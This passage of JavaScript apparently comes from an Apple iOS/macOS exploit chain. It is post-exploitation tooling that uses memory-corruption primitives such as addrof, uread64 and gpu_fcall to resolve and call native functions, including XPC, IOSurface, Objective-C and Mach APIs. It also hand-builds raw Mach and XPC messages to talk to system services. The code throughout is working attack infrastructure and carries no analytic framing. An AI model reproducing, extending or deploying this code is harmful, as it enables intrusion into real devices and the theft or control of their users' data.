  let PTHREAD_ATTR_SETSTACKADDR = func_resolve("pthread_attr_setstackaddr");
  let PTHREAD_MACH_THREAD_NP = func_resolve("pthread_mach_thread_np");
  let PTHREAD_JOIN = func_resolve("pthread_join");
  let PTHREAD_YIELD_NP = func_resolve("pthread_yield_np");
  let THREAD_SUSPEND = func_resolve("thread_suspend");
  let THREAD_RESUME = func_resolve("thread_resume");
  let THREAD_TERMINATE = func_resolve("thread_terminate");
  let THREAD_POLICY_SET = func_resolve("thread_policy_set");
  let PTHREAD_MUTEX_INIT = func_resolve("pthread_mutex_init");
  let PTHREAD_MUTEX_LOCK = func_resolve("pthread_mutex_lock");
  let PTHREAD_MUTEX_UNLOCK = func_resolve("pthread_mutex_unlock");
  let ULOCK_WAIT = func_resolve("__ulock_wait");
  let ULOCK_WAKE = func_resolve("__ulock_wake");
  let SYSCTLBYNAME = func_resolve("sysctlbyname");
  let IOSERVICEMATCHING = func_resolve("IOServiceMatching");
  let IOSERVICEGETMATCHINGSERVICE = func_resolve("IOServiceGetMatchingService");
  let IOSERVICEOPEN = func_resolve("IOServiceOpen");
  let IOSERVICECLOSE = func_resolve("IOServiceClose");
  let IOCONNECTCALLSTRUCTMETHOD = func_resolve("IOConnectCallStructMethod");
  let OBJC_GETCLASS = func_resolve("objc_getClass");
  let OBJC_MSGSEND = func_resolve("objc_msgSend");
  let OBJC_ALLOC = func_resolve("objc_alloc");
  let OBJC_ALLOC_INIT = func_resolve("objc_alloc_init");
  let SEL_REGISTERNAME = func_resolve("sel_registerName");
  let CFDICTIONARYCREATEMUTABLE = func_resolve("CFDictionaryCreateMutable");
  let CFDICTIONARYSETVALUE = func_resolve("CFDictionarySetValue");
  let CFNUMBERCREATE = func_resolve("CFNumberCreate");
  let CFRELEASE = func_resolve("CFRelease");
  let CFSHOW = func_resolve("CFShow");
  let CFSTRINGCREATEWITHCSTRING = func_resolve("CFStringCreateWithCString");
  let IOSURFACECREATE = func_resolve("IOSurfaceCreate");
  let IOSURFACEGETBASEADDRESS = func_resolve("IOSurfaceGetBaseAddress");
  let IOSURFACEPREFETCHPAGES = func_resolve("IOSurfacePrefetchPages");
  let IOSURFACEGETID = func_resolve("IOSurfaceGetID");
  let kCFAllocatorDefault = uread64(func_resolve("kCFAllocatorDefault"));
  let kCFStringEncodingUTF8 = 0x08000100n;
  let kCFTypeDictionaryKeyCallBacks = func_resolve("kCFTypeDictionaryKeyCallBacks");
  let kCFTypeDictionaryValueCallBacks = func_resolve("kCFTypeDictionaryValueCallBacks");
  let kIOSurfaceAllocSize = uread64(func_resolve("kIOSurfaceAllocSize"));
  let selector_evaluateScript = sel_registerName(get_cstring("evaluateScript:"));
  let selector_initWithTarget_selector_object = sel_registerName(get_cstring("initWithTarget:selector:object:"));
  let selector_invocationWithMethodSignature = sel_registerName(get_cstring("invocationWithMethodSignature:"));
  let selector_invoke = sel_registerName(get_cstring("invoke"));
  let selector_isFinished = sel_registerName(get_cstring("isFinished"));
  let selector_methodSignatureForSelector = sel_registerName(get_cstring("methodSignatureForSelector:"));
  let selector_objectForKeyedSubscript = sel_registerName(get_cstring("objectForKeyedSubscript:"));
  let selector_release = sel_registerName(get_cstring("release"));
  let selector_retainCount = sel_registerName(get_cstring("retainCount"));
  let selector_setArgument_atIndex = sel_registerName(get_cstring("setArgument:atIndex:"));
  let selector_start = sel_registerName(get_cstring("start"));
  let cfstr_boxed_arr = create_cfstring(get_cstring("boxed_arr"));
  let cfstr_control_array = create_cfstring(get_cstring("control_array"));
  let cfstr_control_array_8 = create_cfstring(get_cstring("control_array_8"));
  let cfstr_func_offsets_array = create_cfstring(get_cstring("func_offsets_array"));
  let cfstr_isNaN = create_cfstring(get_cstring("isNaN"));
  let cfstr_rw_array = create_cfstring(get_cstring("rw_array"));
  let cfstr_rw_array_8 = create_cfstring(get_cstring("rw_array_8"));
  let cfstr_unboxed_arr = create_cfstring(get_cstring("unboxed_arr"));
  let invoke_class = objc_getClass("NSInvocation");
  let jsc_class = objc_getClass("JSContext");
  let nsthread_class = objc_getClass("NSThread");
  let XPC_RETAIN = func_resolve("xpc_retain");
  let XPC_BOOL_CREATE = func_resolve("xpc_bool_create");
  let XPC_RELEASE = func_resolve("xpc_release");
  let XPC_CONNECTION_CREATE_MACH_SERVICE = func_resolve("xpc_connection_create_mach_service");
  let XPC_CONNECTION_CANCEL = func_resolve("xpc_connection_cancel");
  let XPC_CONNECTION_SET_EVENT_HANDLER = func_resolve("xpc_connection_set_event_handler");
  let XPC_CONNECTION_ACTIVATE = func_resolve("xpc_connection_activate");
  let XPC_CONNECTION_SEND_MESSAGE_WITH_REPLY_SYNC = func_resolve("xpc_connection_send_message_with_reply_sync");
  let XPC_DICTIONARY_CREATE_EMPTY = func_resolve("xpc_dictionary_create_empty");
  let XPC_DICTIONARY_SET_VALUE = func_resolve("xpc_dictionary_set_value");
  let XPC_DICTIONARY_GET_UINT64 = func_resolve("xpc_dictionary_get_uint64");
  let XPC_DICTIONARY_SET_UINT64 = func_resolve("xpc_dictionary_set_uint64");
  let XPC_DICTIONARY_GET_INT64 = func_resolve("xpc_dictionary_get_int64");
  let XPC_ARRAY_CREATE_EMPTY = func_resolve("xpc_array_create_empty");
  let XPC_ARRAY_APPEND_VALUE = func_resolve("xpc_array_append_value");
  let XPC_UINT64_CREATE = func_resolve("xpc_uint64_create");
  let XPC_INT64_CREATE = func_resolve("xpc_int64_create");
  let XPC_DATA_CREATE = func_resolve("xpc_data_create");
  let XPC_DATA_CREATE_WITH_DISPATCH_DATA = func_resolve("xpc_data_create_with_dispatch_data");
  let XPC_STRING_CREATE = func_resolve("xpc_string_create");
  let XPC_UUID_CREATE = func_resolve("xpc_uuid_create");
  let XPC_NULL_CREATE = func_resolve("xpc_null_create");
  let XPC_ENDPOINT_CREATE = func_resolve("xpc_endpoint_create");
  let XPC_ENDPOINT_DISPOSE = func_resolve("xpc_endpoint_dispose");
  let XPC_CONNECTION_SEND_MESSAGE_WITH_REPLY = func_resolve("xpc_connection_send_message_with_reply");
  let IOSURFACE_CREATE_XPC_OBJECT = func_resolve("IOSurfaceCreateXPCObject");
  let MIG_GET_REPLY_PORT = func_resolve("mig_get_reply_port");
  let DISPATCH_DATA_CREATE = func_resolve("dispatch_data_create");
  function xpc_retain(object) {
    return gpu_fcall(XPC_RETAIN, object);
  }
  function xpc_bool_create(value) {
    return gpu_fcall(XPC_BOOL_CREATE, value);
  }
  function xpc_release(object) {
    return gpu_fcall(XPC_RELEASE, object);
  }
  function xpc_connection_cancel(object) {
    return gpu_fcall(XPC_CONNECTION_CANCEL, object);
  }
  function xpc_connection_create_mach_service(x0, x1, x2) {
    if (typeof x0 === "string") {
      x0 = get_cstring(x0);
    }
    return gpu_fcall(XPC_CONNECTION_CREATE_MACH_SERVICE, x0, x1, x2);
  }
  function xpc_connection_set_event_handler(x0, x1) {
    return gpu_fcall(XPC_CONNECTION_SET_EVENT_HANDLER, x0, x1);
  }
  function xpc_connection_activate(x0) {
    return gpu_fcall(XPC_CONNECTION_ACTIVATE, x0);
  }
  function xpc_connection_send_message_with_reply_sync(connection, message) {
    return gpu_fcall(XPC_CONNECTION_SEND_MESSAGE_WITH_REPLY_SYNC, connection, message);
  }
  function xpc_dictionary_create_empty() {
    return gpu_fcall(XPC_DICTIONARY_CREATE_EMPTY);
  }
  function xpc_dictionary_set_value(dict, key, value) {
    if (typeof key === "string") {
      key = get_cstring(key);
    }
    return gpu_fcall(XPC_DICTIONARY_SET_VALUE, dict, key, value);
  }
  function xpc_dictionary_get_uint64(dict, key) {
    if (typeof key === "string") {
      key = get_cstring(key);
    }
    return gpu_fcall(XPC_DICTIONARY_GET_UINT64, dict, key);
  }
  function xpc_dictionary_set_uint64(dict, key, value) {
    if (typeof key === "string") {
      key = get_cstring(key);
    }
    return gpu_fcall(XPC_DICTIONARY_SET_UINT64, dict, key, value);
  }
  function xpc_dictionary_get_int64(dict, key) {
    if (typeof key === "string") {
      key = get_cstring(key);
    }
    return gpu_fcall(XPC_DICTIONARY_GET_INT64, dict, key);
  }
  function xpc_array_create_empty() {
    return gpu_fcall(XPC_ARRAY_CREATE_EMPTY);
  }
  function xpc_array_append_value(array, value) {
    return gpu_fcall(XPC_ARRAY_APPEND_VALUE, array, value);
  }
  function xpc_uint64_create(value) {
    if (typeof value == "number") {
      value = BigInt(value);
    }
    return gpu_fcall(XPC_UINT64_CREATE, value);
  }
  function xpc_int64_create(value) {
    if (typeof value == "number") {
      value = BigInt(value);
    }
    return gpu_fcall(XPC_INT64_CREATE, value);
  }
  function xpc_data_create(bytes, length) {
    return gpu_fcall(XPC_DATA_CREATE, bytes, length);
  }
  function xpc_data_create_with_dispatch_data(ddata) {
    return gpu_fcall(XPC_DATA_CREATE_WITH_DISPATCH_DATA, ddata);
  }
  function xpc_string_create(string) {
    if (typeof string === "string") {
      string = get_cstring(string);
    }
    return gpu_fcall(XPC_STRING_CREATE, string);
  }
  function xpc_uuid_create(uuid) {
    if (typeof uuid === "object") {
      uuid = wc_uread64(addrof(uuid).add(0x10n));
    }
    if (integrated) {
      uuid = gpuCopyBuffer(uuid, 0x10n);
    }
    return gpu_fcall(XPC_UUID_CREATE, uuid);
  }
  function xpc_null_create() {
    return gpu_fcall(XPC_NULL_CREATE);
  }
  function xpc_endpoint_create(conn) {
    return gpu_fcall(XPC_ENDPOINT_CREATE, conn);
  }
  function xpc_endpoint_dispose(conn) {
    return gpu_fcall(XPC_ENDPOINT_DISPOSE, conn);
  }
  function xpc_connection_send_message_with_reply(a, b, c, d) {
    return gpu_fcall(XPC_CONNECTION_SEND_MESSAGE_WITH_REPLY, a, b, c, d);
  }
  function IOSurfaceCreateXPCObject(surface) {
    return gpu_fcall(IOSURFACE_CREATE_XPC_OBJECT, surface);
  }
  function mig_get_reply_port() {
    return gpu_fcall(MIG_GET_REPLY_PORT);
  }
  function dispatch_data_create(buffer, size, queue, destructor) {
    return gpu_fcall(DISPATCH_DATA_CREATE, buffer, size, queue, destructor);
  }
  let MACH_MSG_TIMEOUT_NONE = 0n;
  let MACH_PORT_RIGHT_SEND = 0n;
  let MACH_PORT_RIGHT_RECEIVE = 1n;
  let MACH_PORT_RIGHT_SEND_ONCE = 2n;
  let MACH_PORT_RIGHT_PORT_SET = 3n;
  let MACH_PORT_RIGHT_DEAD_NAME = 4n;
  let MACH_PORT_RIGHT_LABELH = 5n;
  let MACH_PORT_RIGHT_NUMBER = 6n;
  let MACH_MSG_TYPE_MOVE_RECEIVE = 16n;
  let MACH_MSG_TYPE_MOVE_SEND = 17n;
  let MACH_MSG_TYPE_MOVE_SEND_ONCE = 18n;
  let MACH_MSG_TYPE_COPY_SEND = 19n;
  let MACH_MSG_TYPE_MAKE_SEND = 20n;
  let MACH_MSG_TYPE_MAKE_SEND_ONCE = 21n;
  let MACH_MSG_TYPE_COPY_RECEIVE = 22n;
  let MACH_MSG_TYPE_DISPOSE_RECEIVE = 24n;
  let MACH_MSG_TYPE_DISPOSE_SEND = 25n;
  let MACH_MSG_TYPE_DISPOSE_SEND_ONCE = 26n;
  let MACH_MSG_PORT_DESCRIPTOR = 0n;
  let MACH_MSG_OOL_DESCRIPTOR = 1n;
  let MACH_MSG_OOL_PORTS_DESCRIPTOR = 2n;
  let MACH_MSG_OOL_VOLATILE_DESCRIPTOR = 3n;
  let MACH_MSG_GUARDED_PORT_DESCRIPTOR = 4n;
  let MACH_MSG_OPTION_NONE = 0x00000000n;
  let MACH_MSG_STRICT_REPLY = 0x00000200n;
  let MACH_SEND_MSG = 0x00000001n;
  let MACH_RCV_MSG = 0x00000002n;
  let MACH_RCV_LARGE = 0x00000004n;
  let MACH_RCV_LARGE_IDENTITY = 0x00000008n;
  let MACH_SEND_TIMEOUT = 0x00000010n;
  let MACH_SEND_OVERRIDE = 0x00000020n;
  let MACH_SEND_INTERRUPT = 0x00000040n;
  let MACH_SEND_NOTIFY = 0x00000080n;
  let MACH_SEND_ALWAYS = 0x00010000n;
  let MACH_SEND_FILTER_NONFATAL = 0x00010000n;
  let MACH_SEND_TRAILER = 0x00020000n;
  let MACH_SEND_NOIMPORTANCE = 0x00040000n;
  let MACH_SEND_NODENAP = null && MACH_SEND_NOIMPORTANCE;
  let MACH_SEND_IMPORTANCE = 0x00080000n;
  let MACH_SEND_SYNC_OVERRIDE = 0x00100000n;
  let MACH_SEND_PROPAGATE_QOS = 0x00200000n;
  let MACH_SEND_SYNC_USE_THRPRI = null && MACH_SEND_PROPAGATE_QOS;
  let MACH_SEND_KERNEL = 0x00400000n;
  let MACH_SEND_SYNC_BOOTSTRAP_CHECKIN = 0x00800000n;
  let MACH_RCV_TIMEOUT = 0x00000100n;
  let MACH_RCV_NOTIFY = 0x00000000n;
  let MACH_RCV_INTERRUPT = 0x00000400n;
  let MACH_RCV_VOUCHER = 0x00000800n;
  let MACH_RCV_OVERWRITE = 0x00000000n;
  let MACH_RCV_GUARDED_DESC = 0x00001000n;
  let MACH_RCV_SYNC_WAIT = 0x00004000n;
  let MACH_RCV_SYNC_PEEK = 0x00008000n;
  let MACH_MSGH_BITS_ZERO = 0x00000000n;
  let MACH_MSGH_BITS_REMOTE_MASK = 0x0000001fn;
  let MACH_MSGH_BITS_LOCAL_MASK = 0x00001f00n;
  let MACH_MSGH_BITS_VOUCHER_MASK = 0x001f0000n;
  let MACH_MSGH_BITS_PORTS_MASK = MACH_MSGH_BITS_REMOTE_MASK | MACH_MSGH_BITS_LOCAL_MASK | MACH_MSGH_BITS_VOUCHER_MASK;
  let MACH_MSGH_BITS_COMPLEX = 0x80000000n;
  let MACH_MSGH_BITS_USER = 0x801f1f1fn;
  let MACH_MSGH_BITS_RAISEIMP = 0x20000000n;
  let MACH_MSGH_BITS_DENAP = null && MACH_MSGH_BITS_RAISEIMP;
  let MACH_MSGH_BITS_IMPHOLDASRT = 0x10000000n;
  let MACH_MSGH_BITS_DENAPHOLDASRT = null && MACH_MSGH_BITS_IMPHOLDASRT;
  let MACH_MSGH_BITS_CIRCULAR = 0x10000000n;
  let MACH_MSGH_BITS_USED = 0xb01f1f1fn;
  let MACH_MSG_PHYSICAL_COPY = 0n;
  let MACH_MSG_VIRTUAL_COPY = 1n;
  let MACH_MSG_ALLOCATE = 2n;
  let MACH_MSG_OVERWRITE = 3n;
  let MACH_MSG_KALLOC_COPY_T = 4n;
  let MACH_SEND_TIMED_OUT = 0x10000004n;
  function MACH_MSGH_BITS(remote, local) {
    return remote | local << 8n;
  }
  function MACH_MSGH_BITS_SET_PORTS(remote, local, voucher) {
    return remote & MACH_MSGH_BITS_REMOTE_MASK | local << 8n & MACH_MSGH_BITS_LOCAL_MASK | voucher << 16n & MACH_MSGH_BITS_VOUCHER_MASK;
  }
  function MACH_MSGH_BITS_SET(remote, local, voucher, other) {
    return MACH_MSGH_BITS_SET_PORTS(remote, local, voucher) | other & ~MACH_MSGH_BITS_PORTS_MASK;
  }
  let mach_msg_header_t = {
    "msgh_bits": [UINT32_BITSIZE, 0x0n],
    "msgh_size": [UINT32_BITSIZE, 0x4n],
    "msgh_remote_port": [UINT32_BITSIZE, 0x8n],
    "msgh_local_port": [UINT32_BITSIZE, 0xcn],
    "msgh_voucher_port": [UINT32_BITSIZE, 0x10n],
    "msgh_id": [UINT32_BITSIZE, 0x14n],
    "_size": 0x18n
  };
  let mach_msg_body_t = {
    "msgh_descriptor_count": [UINT32_BITSIZE, 0x0n],
    "_size": 0x4n
  };
  let mach_msg_port_descriptor_t = {
    "name": [UINT32_BITSIZE, 0x0n],
    "pad1": [UINT32_BITSIZE, 0x4n],
    "pad2": [UINT16_BITSIZE, 0x8n],
    "disposition": [UINT8_BITSIZE, 0xan],
    "type": [UINT8_BITSIZE, 0xbn],
    "_size": 0xcn
  };
  let mach_msg_ool_descriptor_t = {
    "address": [UINT64_BITSIZE, 0x0n],
    "deallocate": [UINT8_BITSIZE, 0x8n],
    "copy": [UINT8_BITSIZE, 0x9n],
    "pad1": [UINT8_BITSIZE, 0xan],
    "type": [UINT8_BITSIZE, 0xbn],
    "size": [UINT32_BITSIZE, 0xcn],
    "_size": 0x10n
  };
  function mach_msg_header_set(msg, field, val) {
    struct_field_set(mach_msg_header_t, msg, field, val);
  }
  function mach_msg_body_set(msg, field, val) {
    struct_field_set(mach_msg_body_t, msg, field, val);
  }
  function mach_msg_port_descriptor_set(msg, field, val) {
    struct_field_set(mach_msg_port_descriptor_t, msg, field, val);
  }
  function mach_msg_ool_descriptor_set(msg, field, val) {
    struct_field_set(mach_msg_ool_descriptor_t, msg, field, val);
  }
  let OXPC_TYPE_NULL = 0x1000n;
  let OXPC_TYPE_BOOL = 0x2000n;
  let OXPC_TYPE_INT64 = 0x3000n;
  let OXPC_TYPE_UINT64 = 0x4000n;
  let OXPC_TYPE_DATA = 0x8000n;
  let OXPC_TYPE_OOL_DATA = 0x8001n;
  let OXPC_TYPE_STRING = 0x9000n;
  let OXPC_TYPE_UUID = 0xa000n;
  let OXPC_TYPE_MACH_SEND = 0xd000n;
  let OXPC_TYPE_ARRAY = 0xe000n;
  let OXPC_TYPE_DICTIONARY = 0xf000n;
  let OXPC_TYPE_INVALID = 0xbaadn;
  let oxpc_arbitrary_size_limit = 0x50000000;
  function round_up_32(base, unit) {
    return base + (unit - 1n) & ~(unit - 1n);
  }
  let oxpc_dictionary_serialized_t = {
    "type": [UINT32_BITSIZE, 0x0n],
    "byte_count": [UINT32_BITSIZE, 0x4n],
    "count": [UINT32_BITSIZE, 0x8n],
    "_size": 0xcn
  };
  let oxpc_null_t = {
    "type": [UINT32_BITSIZE, 0x0n],
    "_size": 0x4n
  };
  function xpcjs_lookup(service_name) {
    let service_port_ptr = new_uint64_t();
    let bootstrap_port = 0x807n;
    let kr = bootstrap_look_up(bootstrap_port, get_cstring(service_name), service_port_ptr);
    if (kr != KERN_SUCCESS) {
      return MACH_PORT_NULL;
    }
    let service_port = uread32(service_port_ptr);
    if (service_port == MACH_PORT_NULL) {
      return MACH_PORT_NULL;
    }
    return service_port;
  }
  function xpcjs_xpc_checkin(service_port, client_port_addr, reply_port_addr) {
    let kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, client_port_addr);
    if (kr != KERN_SUCCESS) {
      return kr;
    }
    kr = mach_port_insert_right(mach_task_self(), uread32(client_port_addr), uread32(client_port_addr), MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
      return kr;
    }
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, reply_port_addr);
    if (kr != KERN_SUCCESS) {
      return kr;
    }
    let msg_sz = mach_msg_header_t["_size"] + mach_msg_body_t["_size"] + mach_msg_port_descriptor_t["_size"] * 0x2n;
    let msg = calloc(1n, msg_sz);
    let hdr = msg;
    mach_msg_header_set(hdr, "msgh_bits", MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0n, 0n, MACH_MSGH_BITS_COMPLEX));
    mach_msg_header_set(hdr, "msgh_size", msg_sz);
    mach_msg_header_set(hdr, "msgh_remote_port", service_port);
    mach_msg_header_set(hdr, "msgh_id", 0x77303074n);
    let body = msg + mach_msg_header_t["_size"];
    mach_msg_body_set(body, "msgh_descriptor_count", 2n);
    let port_0 = body + mach_msg_body_t["_size"];
    mach_msg_port_descriptor_set(port_0, "name", uread32(client_port_addr));
    mach_msg_port_descriptor_set(port_0, "disposition", MACH_MSG_TYPE_MOVE_RECEIVE);
    mach_msg_port_descriptor_set(port_0, "type", MACH_MSG_PORT_DESCRIPTOR);
    let port_1 = port_0 + mach_msg_port_descriptor_t["_size"];
    mach_msg_port_descriptor_set(port_1, "name", uread32(reply_port_addr));
    mach_msg_port_descriptor_set(port_1, "disposition", MACH_MSG_TYPE_MAKE_SEND);
    mach_msg_port_descriptor_set(port_1, "type", MACH_MSG_PORT_DESCRIPTOR);
    kr = mach_msg(msg, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, msg_sz, 0n, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (kr != KERN_SUCCESS) {
      return kr;
    }
    return KERN_SUCCESS;
  }
  function xpcjs_xpc_connect(service_name) {
    let connection = {};
    connection["client_port"] = new_uint64_t();
    connection["reply_port"] = new_uint64_t();
    let service_port = xpcjs_lookup(service_name);
    let kr = xpcjs_xpc_checkin(service_port, connection["client_port"], connection["reply_port"]);
    mach_port_deallocate(mach_task_self(), service_port);
    if (kr != KERN_SUCCESS) {
      LOG(`Failed to connect to ${service_name}, kr: ${kr.hex()}`);
      return null;
    }
    connection["client_port"] = uread32(connection["client_port"]);
    connection["reply_port"] = uread32(connection["reply_port"]);
    return connection;
  }
  function oxpc_check_type(obj, type) {
    if (obj["type"] != type) {
      ERROR(`type mismatch: ${type} ${obj["type"]}`);
    }
  }
  function oxpc_dictionary_alloc() {
    let dict = {};
    dict["type"] = OXPC_TYPE_DICTIONARY;
    dict["count"] = 0n;
    dict["serialized_size"] = 0n;
    dict["keys"] = [];
    dict["values"] = [];
    return dict;
  }
  function oxpc_null_alloc() {
    let obj = {};
    obj["type"] = OXPC_TYPE_NULL;
    return obj;
  }
  function oxpc_dictionary_append(dict, key, value) {
    oxpc_check_type(dict, OXPC_TYPE_DICTIONARY);
    if (dict["count"] > oxpc_arbitrary_size_limit) {
      ERROR("oxpc dictionary grew too large");
    }
    dict["count"] += 0x1n;
    dict["keys"].push(strdup(key));
    dict["values"].push(value);
  }
  function oxpc_dictionary_type_descriptor() {
    let desc = {};
    desc["serialized_size"] = function (dict) {
      oxpc_check_type(dict, OXPC_TYPE_DICTIONARY);
      if (dict["serialized_size"] != 0n) {
        return dict["serialized_size"];
      }
      let total = 0n;
      for (let i = 0n; i < dict["count"]; i++) {
        let key_size = round_up_32(strlen(dict["keys"][i]) + 1n, 4n);
        let value_size = oxpc_object_serialized_size(dict["values"][i]);
        if (key_size > oxpc_arbitrary_size_limit) {
          ERROR("dictionary key too large for serialization");
        }
        if (value_size > oxpc_arbitrary_size_limit) {
          ERROR("dictionary value too large for serialization");
        }
        if (total > oxpc_arbitrary_size_limit) {
          ERROR("dictionary too large for serialization");
        }
        total += key_size + value_size;
      }
      dict["serialized_size"] = oxpc_dictionary_serialized_t["_size"] + total;
      return dict["serialized_size"];
    };
    desc["serialize_to_buffer"] = function (dict, buffer, ports) {
      oxpc_check_type(dict, OXPC_TYPE_DICTIONARY);
      let serialized_dict = buffer;
      struct_field_set(oxpc_dictionary_serialized_t, serialized_dict, "type", dict["type"]);
      struct_field_set(oxpc_dictionary_serialized_t, serialized_dict, "byte_count", oxpc_object_serialized_size(dict) - 0x8n);
      struct_field_set(oxpc_dictionary_serialized_t, serialized_dict, "count", dict["count"]);
      let dict_buffer = serialized_dict + oxpc_dictionary_serialized_t["_size"];
      for (let i = 0n; i < dict["count"]; i++) {
        let key_size = strlen(dict["keys"][i]) + 1n;
        memcpy(dict_buffer, dict["keys"][i], key_size);
        key_size = round_up_32(key_size, 4n);
        dict_buffer += key_size;
        let value_size = oxpc_object_serialized_size(dict["values"][i]);
        oxpc_object_serialize_to_buffer(dict["values"][i], dict_buffer, ports);
        dict_buffer += value_size;
      }
    };
    return desc;
  }
  function oxpc_null_type_descriptor() {
    let desc = {};
    desc["serialized_size"] = function (obj) {
      oxpc_check_type(obj, OXPC_TYPE_NULL);
      return oxpc_null_t["_size"];
    };
    desc["serialize_to_buffer"] = function (obj, buffer, ports) {
      oxpc_check_type(obj, OXPC_TYPE_NULL);
      uwrite_bitsize(buffer, OXPC_TYPE_NULL, 32n);
    };
    return desc;
  }
  function oxpc_get_type_descriptor(obj) {
    switch (obj["type"]) {
      case OXPC_TYPE_STRING:
        return oxpc_string_type_descriptor;
      case OXPC_TYPE_INT64:
        return oxpc_int64_type_descriptor;
      case OXPC_TYPE_UINT64:
        return oxpc_uint64_type_descriptor;
      case OXPC_TYPE_ARRAY:
        return oxpc_array_type_descriptor;
      case OXPC_TYPE_DICTIONARY:
        return oxpc_dictionary_type_descriptor();
      case OXPC_TYPE_OOL_DATA:
        return oxpc_ool_data_type_descriptor;
      case OXPC_TYPE_UUID:
        return oxpc_uuid_type_descriptor;
      case OXPC_TYPE_MACH_SEND:
        return oxpc_mach_send_type_descriptor;
      case OXPC_TYPE_DATA:
        return oxpc_data_type_descriptor;
      case OXPC_TYPE_NULL:
        return oxpc_null_type_descriptor();
      case OXPC_TYPE_INVALID:
        return oxpc_invalid_type_descriptor;
      default:
        ERROR("unrecognized oxpc type");
    }
    return NULL;
  }
  function oxpc_object_serialized_size(obj) {
    let desc = oxpc_get_type_descriptor(obj);
    return desc["serialized_size"](obj);
  }
  function oxpc_object_serialize_to_buffer(obj, buffer, ports) {
    oxpc_get_type_descriptor(obj)["serialize_to_buffer"](obj, buffer, ports);
  }
  function oxpc_port_list_alloc() {
    let list = {};
    list["count"] = 0n;
    list["ports"] = [];
    return list;
  }
  function oxpc_port_list_append(list, port) {
    if (list["count"] > oxpc_arbitrary_size_limit) {
      ERROR("oxpc_ports_list too large");
    }
    list["count"] += 0x1n;
    list["ports"].push(port);
  }
  function oxpc_object_serialize_with_header(obj) {
    let total_size = oxpc_object_serialized_size(obj);
    if (total_size > oxpc_arbitrary_size_limit) {
      ERROR("oxpc object too large to be serialized");
    }
    total_size += 8n;
    let buffer = calloc(1n, total_size);
    if (buffer == NULL) {
      ERROR("unable to allocate memory for serialized oxpc object");
    }
    memset(buffer, 0n, total_size);
    uwrite_bitsize(buffer, 0x40585043n, 32n);
    uwrite_bitsize(buffer + 0x4n, 0x5n, 32n);
    let ports = oxpc_port_list_alloc();
    oxpc_object_serialize_to_buffer(obj, buffer + 0x8n, ports);
    return {
      "buffer": buffer,
      "total_size": total_size,
      "ports": ports
    };
  }
  function oxpc_build_mach_message(serialized_payload, serialized_payload_size, body_ool, port_list, destination_port, reply_port) {
    let is_complex_message = false;
    if (port_list["count"] > 0n || body_ool) {
      is_complex_message = true;
    }
    let msg_body_size = mach_msg_header_t["_size"];
    if (is_complex_message) {
      msg_body_size += mach_msg_body_t["_size"];
    }
    if (body_ool != 0n) {
      msg_body_size += mach_msg_ool_descriptor_t["_size"];
    }
    if (is_complex_message) {
      msg_body_size += port_list["count"] * mach_msg_port_descriptor_t["_size"];
    }
    if (body_ool == 0n) {
      msg_body_size += serialized_payload_size;
    }
    let message = calloc(1n, msg_body_size + 0x100n);
    if (message == NULL) {
      ERROR("not enough memory to allocate mach message");
    }
    let hdr = message;
    let destination_disposition = 0n;
    if (destination_port != MACH_PORT_NULL) {
      destination_disposition = MACH_MSG_TYPE_COPY_SEND;
    }
    let reply_disposition = 0n;
    if (reply_port != MACH_PORT_NULL) {
      reply_disposition = MACH_MSG_TYPE_MAKE_SEND_ONCE;
    }
    let flag = 0n;
    if (is_complex_message) {
      flag = MACH_MSGH_BITS_COMPLEX;
    }
    mach_msg_header_set(hdr, "msgh_bits", MACH_MSGH_BITS_SET(destination_disposition, reply_disposition, 0n, flag));
    mach_msg_header_set(hdr, "msgh_size", msg_body_size);
    mach_msg_header_set(hdr, "msgh_remote_port", destination_port);
    mach_msg_header_set(hdr, "msgh_local_port", reply_port);
    mach_msg_header_set(hdr, "msgh_voucher_port", MACH_PORT_NULL);
    mach_msg_header_set(hdr, "msgh_id", 0x10000000n);
    let message_body = hdr + mach_msg_header_t["_size"];
    ;
    if (is_complex_message) {
      let body = message_body;
      mach_msg_body_set(body, "msgh_descriptor_count", port_list["count"]);
      if (body_ool != 0n) {
        mach_msg_body_set(body, "msgh_descriptor_count", port_list["count"] + 0x1n);
      }
      let next = body + mach_msg_body_t["_size"];
      if (body_ool != 0n) {
        let desc = next;
        mach_msg_ool_descriptor_set(desc, "address", serialized_payload);
        mach_msg_ool_descriptor_set(desc, "copy", MACH_MSG_VIRTUAL_COPY);
        mach_msg_ool_descriptor_set(desc, "deallocate", 0n);
        mach_msg_ool_descriptor_set(desc, "size", serialized_payload_size);
        mach_msg_ool_descriptor_set(desc, "type", MACH_MSG_OOL_DESCRIPTOR);
        next = desc + mach_msg_ool_descriptor_t["_size"];
      }
      let desc = next;
      for (let i = 0n; i < port_list["count"]; i++) {
        mach_msg_port_descriptor_set(desc, "name", port_list["ports"][i]);
        mach_msg_port_descriptor_set(desc, "disposition", MACH_MSG_TYPE_COPY_SEND);
        mach_msg_port_descriptor_set(desc, "type", MACH_MSG_PORT_DESCRIPTOR);
        desc += mach_msg_port_descriptor_t["_size"];
      }
      message_body = desc;
    }
    if (body_ool == 0n) {
      memcpy(message_body, serialized_payload, serialized_payload_size);
    }
    return {
      "message": message,
      "message_size": msg_body_size
    };
  }
